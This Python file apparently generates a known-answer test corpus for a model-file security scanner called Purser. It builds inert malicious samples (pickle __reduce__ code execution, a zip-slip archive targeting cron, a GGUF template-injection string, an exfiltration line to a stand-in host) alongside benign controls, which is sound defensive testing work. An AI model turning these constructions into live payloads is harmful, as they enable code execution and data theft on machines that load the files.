"""Known-Answer Test corpus for the Purser validation benchmark.

Generates inert malicious and synthetic-benign model artifacts covering the
attack classes Purser claims, reusing the same constructions as the unit-test
fixtures. Payloads are inert (`os.system("true")` etc.); the scanner never
executes them. Nothing here is committed — everything is generated into work/.
"""
from __future__ import annotations

import base64
import gzip
import io
import json
import pickle
import struct
import zipfile
from pathlib import Path


class _OsSystem:
    def __reduce__(self):
        import os
        return (os.system, ("true",))


class _Eval:
    def __reduce__(self):
        return (eval, ("1+1",))


class _Net:
    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, ("https://evil.example.invalid/x",))


def build(dest: Path) -> list[dict]:
    """Materialize the corpus under `dest`; return manifest entries."""
    dest.mkdir(parents=True, exist_ok=True)
    entries: list[dict] = []

    def add(cid: str, rel: str, label: str, fmt: str, attack: str) -> None:
        entries.append({
            "id": cid, "path": str(dest / rel), "label": label,
            "format": fmt, "attack_class": attack,
        })

    # ---------------- malicious (must be detected) ----------------
    (dest / "pkl_os.pkl").write_bytes(pickle.dumps(_OsSystem()))
    add("pkl-os", "pkl_os.pkl", "malicious", "pickle", "pickle: os.system via REDUCE")

    (dest / "pkl_eval.pkl").write_bytes(pickle.dumps(_Eval(), protocol=0))
    add("pkl-eval", "pkl_eval.pkl", "malicious", "pickle", "pickle: eval (protocol 0)")

    (dest / "pkl_net.pkl").write_bytes(pickle.dumps(_Net()))
    add("pkl-net", "pkl_net.pkl", "malicious", "pickle", "pickle: network callable")

    with zipfile.ZipFile(dest / "model.pt", "w") as z:
        z.writestr("model/data.pkl", pickle.dumps(_OsSystem()))
        z.writestr("model/version", "3")
    add("pt-zip", "model.pt", "malicious", "pytorch", "pytorch zip: malicious data.pkl")

    payload = pickle.dumps(_OsSystem())
    hd = "{'descr': '|O', 'fortran_order': False, 'shape': (1,), }".encode("latin1")
    hd += b" " * (64 - ((10 + len(hd) + 1) % 64)) + b"\n"
    (dest / "arr.npy").write_bytes(
        b"\x93NUMPY\x01\x00" + struct.pack("<H", len(hd)) + hd + payload)
    add("npy-obj", "arr.npy", "malicious", "numpy", "numpy object-dtype embedded pickle")

    (dest / "model.h5").write_bytes(
        b"\x89HDF\r\n\x1a\n" + b"\x00" * 64 +
        b'{"class_name": "Lambda", "config": {"function": "..."}}')
    add("h5-lambda", "model.h5", "malicious", "keras", "keras Lambda layer")

    (dest / "model.gguf").write_bytes(
        b"GGUF" + struct.pack("<IQQ", 3, 0, 1) + b"tokenizer.chat_template" +
        b"{{ ''.__class__.__mro__[1].__subclasses__() }}")
    add("gguf-ssti", "model.gguf", "malicious", "gguf", "GGUF chat-template SSTI")

    (dest / "saved_model.pb").write_bytes(b"\x0a\x20somegraph" + b"PyFunc" + b"\x00" * 32)
    add("pb-pyfunc", "saved_model.pb", "malicious", "tf_savedmodel", "TF PyFunc op")

    with zipfile.ZipFile(dest / "payload.zip", "w") as z:
        z.writestr("../../etc/cron.d/evil", "* * * * * root true\n")
    add("zip-slip", "payload.zip", "malicious", "archive", "archive zip-slip traversal")

    blob = io.BytesIO()
    blob.write(b"\x00\x01" * 512)
    blob.write(b"https://hooks.slack.com/services/T0001111/B0002222/XXXXXXXXXXXXXXXXXXXXXXXX")
    blob.write(b"\x00" * 32 + b"AKIAIOSFODNN7EXAMPLE" + b"\x00" * 32)
    blob.write(b"import socket; requests.post('http://203.0.113.7:4444/x', data=d)")
    (dest / "weights.bin").write_bytes(b"WGHT" + blob.getvalue())
    add("exfil-bin", "weights.bin", "malicious", "exfil", "embedded webhook + AWS key + code")

    enc = base64.b64encode(gzip.compress(
        b"https://hooks.slack.com/services/T1/B2/ZZZZZZZZZZZZZZZZZZZZZZZZ"))
    (dest / "packed.bin").write_bytes(b"WGHT" + b"\x00" * 16 + enc)
    add("exfil-b64gz", "packed.bin", "malicious", "exfil", "base64+gzip-encoded webhook")

    trc = dest / "trc_model"
    trc.mkdir(exist_ok=True)
    (trc / "config.json").write_text(json.dumps(
        {"model_type": "custom", "auto_map": {"AutoModel": "modeling_evil.MyModel"}}))
    (trc / "modeling_evil.py").write_text("import os\nos.system('true')\n")
    add("trc", "trc_model", "malicious", "trust_remote_code", "auto_map -> os.system source")

    # ---------------- synthetic benign (must NOT hard-fail) ----------------
    (dest / "benign.pkl").write_bytes(pickle.dumps({"weights": [1.0, 2.0], "layers": ("a", "b")}))
    add("benign-pkl", "benign.pkl", "benign", "pickle", "-")

    with zipfile.ZipFile(dest / "clean.pt", "w") as z:
        z.writestr("model/data.pkl", pickle.dumps({"w": [0.5]}))
        z.writestr("model/version", "3")
    add("benign-pt", "clean.pt", "benign", "pytorch", "-")

    header = b'{"emb":{"dtype":"F32","shape":[2,2],"data_offsets":[0,16]}}'
    (dest / "clean.safetensors").write_bytes(struct.pack("<Q", len(header)) + header + b"\x00" * 16)
    add("benign-st", "clean.safetensors", "benign", "safetensors", "-")

    (dest / "clean.gguf").write_bytes(
        b"GGUF" + struct.pack("<IQQ", 3, 0, 1) + b"tokenizer.chat_template{{ messages }}")
    add("benign-gguf", "clean.gguf", "benign", "gguf", "-")

    return entries


if __name__ == "__main__":
    n = build(Path(__file__).parent / "work" / "kat")
    print(f"generated {len(n)} KAT samples "
          f"({sum(e['label']=='malicious' for e in n)} malicious, "
          f"{sum(e['label']=='benign' for e in n)} benign)")
